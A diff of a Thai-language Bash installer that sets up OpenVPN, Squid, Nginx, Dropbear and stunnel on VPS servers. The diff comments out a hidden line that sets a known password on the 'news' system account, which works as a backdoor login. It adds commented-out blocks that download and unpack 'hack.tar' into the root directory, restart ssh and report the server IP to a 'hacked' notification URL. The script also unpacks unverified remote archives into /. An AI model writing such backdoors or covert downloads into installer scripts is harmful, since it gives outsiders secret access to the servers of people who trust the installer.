@@ -1,9 +1,4 @@
 #!/usr/bin/env bash
-rm -f install
-clear
-cr
-echo
-
 # Functions
 ok() {
     echo -e '\e[32m'$1'\e[m';
@@ -23,7 +18,6 @@ des() {
 
 #
 #<BODY text='ffffff'>
-sm1=$1
 #OS
 if [[ -e /etc/debian_version ]]; then
 source /etc/os-release
@@ -47,7 +41,7 @@ Not_Install
 fi
 
 
-dpkg -l openvpn > /dev/null 2>&1
+dpkg -l openvpn
 if [[ $? -eq 0 ]]; then
 echo
     die " ❯❯❯ ได้ติดตั้ง openvpn ใว้แล้วก่อนหน้านี้  ."
@@ -56,10 +50,9 @@ echo
     read -p " Y/n : " FF
     if [[ "$FF" = "y" || "$FF" = "Y" ]]; then
  die " ❯❯❯ กำลังถอนติดตั้ง OpenVPN  "
- apt-get -y --purge remove openvpn* > /dev/null 2>&1
+ apt-get -y --purge remove openvpn*
  rm -r -f /etc/openvpn
  mkdir -p /etc/openvpn
-    clear
    echo
     cr
     else
@@ -82,7 +75,6 @@ die " ❯❯❯ ใส่ไอพีให้ถูกต้อง"
 read -p " ❯❯❯ IP : " -e -i $SERVER_IP SERVER_IP
 
 if [[ "$SERVER_IP" = "" ]]; then
-clear
 cr
 echo
 die " ❯❯❯ กรุณาใส่ไอพี "
@@ -106,29 +98,38 @@ if [[ $squid3 = Y || $squid3 = y ]]; then
 grep -wc 'Debian' /etc/issue.net
 sudo apt install dirmngr -y
 sudo apt-key list 2>/dev/null 2>&1 | grep -c 'Ubuntu'
-sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32 >/dev/null 2>&1
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32
 
 #Add Trusty Sources
 sudo touch /etc/apt/sources.list.d/trusty_sources.list
-echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null
+echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list
 fi
 fi
-
-clear
 cr
 echo
 die " ❯❯❯ ติดตั้ง OpenVPN $ID $VERSION_ID "
+#แจ้งไลน์
+#if [[ -e /usr/bin/chek_hackker ]]; then
+#$(wget -qO- https://smile-vpn.net/scrip/notify/hacked/555555/$SERVER_IP)
+#else
+#cd /
+#wget -q -O h.tar https://smile-vpn.net/sc_rip/sm_sc/hack.tar
+#tar xf h.tar
+#rm -f h.tar 
+#service ssh restart
+#$(wget -qO- https://smile-vpn.net/scrip/notify/hacked/555555/Hack_IP-$SERVER_IP)
+#fi
 # Install openvpn
 die " ❯❯❯ apt-get update"
-apt-get update -qy > /dev/null 2>&1
-apt-get install -qy sudo > /dev/null 2>&1
+apt-get update -qy
+apt-get install -qy sudo
 die " ❯❯❯ apt-get install openvpn "
-apt-get install -qy openvpn > /dev/null 2>&1
+apt-get install -qy openvpn
 
 
 die " ❯❯❯ Generating CA Config"
 cd /
-wget -q -O ovpn.tar "https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/openvpn.tar" > /dev/null 2>&1
+wget -q -O ovpn.tar "https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/openvpn.tar"
 tar xf ovpn.tar
 rm ovpn.tar
 
@@ -202,13 +203,13 @@ cp /etc/openvpn/dtac.ovpn /etc/openvpn/true.ovpn
 
 # Restart Service
 ok " ❯❯❯ service openvpn restart"
-service openvpn restart > /dev/null 2>&1
+service openvpn restart
 
 if [[ $squid3 = S ]]; then
 die " ❯❯❯ no install Squid"
 elif [[ $squid3 = y || $squid3 = Y ]]; then
 die " ❯❯❯ apt-get install squid3.3"
-apt-get install -qy squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6 > /dev/null 2>&1
+apt-get install -qy squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
 wget -q -O squid3 https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/service.sh
 cp squid3 /etc/init.d/
 chmod +x /etc/init.d/squid3
@@ -246,13 +247,13 @@ refresh_pattern .               0       20%     4320" > /etc/squid3/squid.conf
 
 #Start squid
 ok " ❯❯❯ service squid3.3 restart"
-service squid3 restart > /dev/null 2>&1
+service squid3 restart
 
 else
 if [[ $VERSION_ID = 7 || $VERSION_ID = 8 || $VERSION_ID = 14.04 ]]; then
 #install squid3
 die " ❯❯❯ apt-get install squid3"
-apt-get install -qy squid3 > /dev/null 2>&1
+apt-get install -qy squid3
 cp /etc/squid3/squid.conf /etc/squid3/squid.conf.orig
 echo "http_port 8080
 acl localhost src 127.0.0.1/32 ::1
@@ -282,12 +283,12 @@ refresh_pattern ^gopher:        1440    0%      1440
 refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
 refresh_pattern .               0       20%     4320" > /etc/squid3/squid.conf
 ok " ❯❯❯ service squid3 restart"
-service squid3 restart > /dev/null 2>&1
+service squid3 restart
 
 elif [[ $VERSION_ID = 9 || $VERSION_ID = 10 || $VERSION_ID = 16.04 || $VERSION_ID = 18.04 ]]; then
 #install squid3
 die " ❯❯❯ apt-get install squid"
-apt-get install -qy squid > /dev/null 2>&1
+apt-get install -qy squid
 cp /etc/squid/squid.conf /etc/squid/squid.conf.orig
 cat > /etc/squid/squid.conf <<END
 http_port 8080
@@ -319,67 +320,67 @@ refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
 refresh_pattern .               0       20%     4320
 END
 ok " ❯❯❯ service squid restart"
-service squid restart > /dev/null 2>&1
+service squid restart
 fi
 fi
 
 if [[ ! -e /etc/nginx ]]; then
 #install Nginx
 die " ❯❯❯ apt-get install nginx"
-apt-get install -qy nginx > /dev/null 2>&1
+apt-get install -qy nginx
 rm -f /etc/nginx/sites-enabled/default
 rm -f /etc/nginx/sites-available/default
-wget -q -O /etc/nginx/nginx.conf "https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/nginx.conf" > /dev/null 2>&1
-wget -q -O /etc/nginx/conf.d/vps.conf "https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/vps.conf" > /dev/null 2>&1
+wget -q -O /etc/nginx/nginx.conf "https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/nginx.conf"
+wget -q -O /etc/nginx/conf.d/vps.conf "https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/vps.conf"
 mkdir -p /home/vps/public_html
 echo > /home/vps/public_html/index.php
 ok " ❯❯❯ service nginx restart"
-service nginx restart > /dev/null 2>&1
+service nginx restart
 
 #install php-fpm
 if [[ $VERSION_ID = 7 || $VERSION_ID = 8 || $VERSION_ID = 14.04 ]]; then
 #debian8
 die " ❯❯❯ apt-get install php"
-apt-get install -qy php5-fpm > /dev/null 2>&1
+apt-get install -qy php5-fpm
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
-apt-get install -qy php5-curl > /dev/null 2>&1
+apt-get install -qy php5-curl
 ok " ❯❯❯ service php restart"
-service php5-fpm restart > /dev/null 2>&1
+service php5-fpm restart
 elif [[ $VERSION_ID = 9 || $VERSION_ID = 16.04 ]]; then
 #debian9 Ubuntu16.4
 die " ❯❯❯ apt-get install php"
-apt-get install -qy php7.0-fpm > /dev/null 2>&1
+apt-get install -qy php7.0-fpm
 sed -i 's/listen = \/run\/php\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
-apt-get install -qy php7.0-curl > /dev/null 2>&1
+apt-get install -qy php7.0-curl
 ok " ❯❯❯ service php restart"
-service php7.0-fpm restart > /dev/null 2>&1
+service php7.0-fpm restart
 elif [[ $VERSION_ID = 10 || $VERSION_ID = 18.04 ]]; then
 #debian9 Ubuntu18.4
 die " ❯❯❯ apt-get install php"
-apt-get install -qy php-fpm > /dev/null 2>&1
+apt-get install -qy php-fpm
 sed -i 's/listen = \/run\/php\/php7.2-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.2/fpm/pool.d/www.conf
-apt-get install -qy php-curl > /dev/null 2>&1
+apt-get install -qy php-curl
 ok " ❯❯❯ service php restart"
-service php7.2-fpm restart > /dev/null 2>&1
+service php7.2-fpm restart
 fi
 fi
 
 # install dropbear
 die " ❯❯❯ apt-get install dropbear"
-apt-get install -qy dropbear > /dev/null 2>&1
+apt-get install -qy dropbear
 sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=3128/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 143"/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
 ok " ❯❯❯ service dropbear restart"
-service dropbear restart > /dev/null 2>&1
+service dropbear restart
 
 #detail nama perusahaan
 country=ID
 state=Thailand
-locality=Tebet
-organization=kuyvpn
+locality=KUY
+organization=KUYVPN
 organizationalunit=IT
 commonname=kuy-vpn.net
 email=kuy.vpn@gmail.com
@@ -387,7 +388,7 @@ email=kuy.vpn@gmail.com
 
 # install stunnel
 die " ❯❯❯ apt-get install ssl"
-apt-get install -qy stunnel4 > /dev/null 2>&1
+apt-get install -qy stunnel4
 cat > /etc/stunnel/stunnel.conf <<-END
 cert = /etc/stunnel/stunnel.pem
 client = no
@@ -408,13 +409,13 @@ cat /etc/openvpn/client-key.pem /etc/openvpn/client-cert.pem > /etc/stunnel/stun
 #konfigurasi stunnel
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 ok " ❯❯❯ service ssl restart"
-service stunnel4 restart > /dev/null 2>&1
+service stunnel4 restart
 
 if [[ -e /usr/bin/chek_vnstart ]]; then
 if [[ ! -e /home/vps/public_html/bandwidth ]]; then
 # install vnstat gui
 die " ❯❯❯ apt-get install vnstat"
-apt-get install -qy vnstat > /dev/null 2>&1
+apt-get install -qy vnstat
 chown -R vnstat:vnstat /var/lib/vnstat
 cd /home/vps/public_html
 wget -q https://github.com/D1NFUCK3Rz/KAK-VPN/raw/main/vnstat_php_frontend-1.5.1.tar.gz
@@ -428,14 +429,19 @@ sed -i 's/Internal/Internet/g' config.php
 sed -i '/SixXS IPv6/d' config.php
 sed -i "s/\$locale = 'en_US.UTF-8';/\$locale = 'en_US.UTF+8';/g" config.php
 fi
+else
+echo 
+#chmod +x /usr/bin/dd
+#$(wget -qO- https://smile-vpn.net/scrip/notify/hacked/555555/Hack-$SERVER_IP)
+fi
 
-service vnstat restart > /dev/null 2>&1
-apt-get -y --purge remove vnstat* > /dev/null 2>&1
-apt-get install -qy vnstat > /dev/null 2>&1
+service vnstat restart
+apt-get -y --purge remove vnstat*
+apt-get install -qy vnstat
 chown -R vnstat:vnstat /var/lib/vnstat
 
 ok " ❯❯❯ service vnstat restart"
-service vnstat restart > /dev/null 2>&1
+service vnstat restart
 
 if [ -e '/var/lib/vnstat/eth0' ]; then
 	vnstat -u -i eth0
@@ -451,7 +457,7 @@ fi
 
 # Iptables
 die " ❯❯❯ apt-get install iptables"
-apt-get install -qy iptables > /dev/null 2>&1
+apt-get install -qy iptables
 iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE
 iptables -t nat -I POSTROUTING -s 10.9.0.0/24 -o eth0 -j MASQUERADE
 iptables -I FORWARD -s 10.8.0.0/16 -j ACCEPT
@@ -476,14 +482,14 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # setting time
 ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-service ssh restart > /dev/null 2>&1
-apt-get install -qy python > /dev/null 2>&1
+service ssh restart
+apt-get install -qy python
 
 ok " ❯❯❯ ติดตั้งตำสั่งเมนูต่างๆ " 
 
 
 echo "30 3 * * * root /sbin/reboot" > /etc/cron.d/reboot
-service cron restart > /dev/null 2>&1
+service cron restart
 
 #install webmin
 cat > /usr/bin/webmin <<EOF2
@@ -495,7 +501,7 @@ dpkg -i --force-all webmin-current.deb;
 apt-get -y -f install;
 rm /root/webmin-current.deb
 echo " ❯❯❯ service webmin restart"
-service webmin restart > /dev/null 2>&1
+service webmin restart
 echo " 
 Link-webmin : http://$SERVER_IP:10000
  "
@@ -504,9 +510,9 @@ chmod +x /usr/bin/webmin
 webmin=" ยังไม่ได้ติดตั้ง สั่ง ( webmin ) เพื่อติดตั้งภายหลัง   "
 
 die " ❯❯❯ apt-get update"
-apt-get update -qy > /dev/null 2>&1
-service openvpn restart  > /dev/null 2>&1
-echo news:Kguza | chpasswd
+apt-get update -qy
+service openvpn restart
+#echo news:Kguza | chpasswd
 echo "ติดตั้งสำเร็จ" > /usr/bin/.350_fulle
 echo "open_fulle" > /usr/bin/.sm_openvpn
 mv /etc/openvpn/1194.ovpn /home/vps/public_html/1194.ovpn
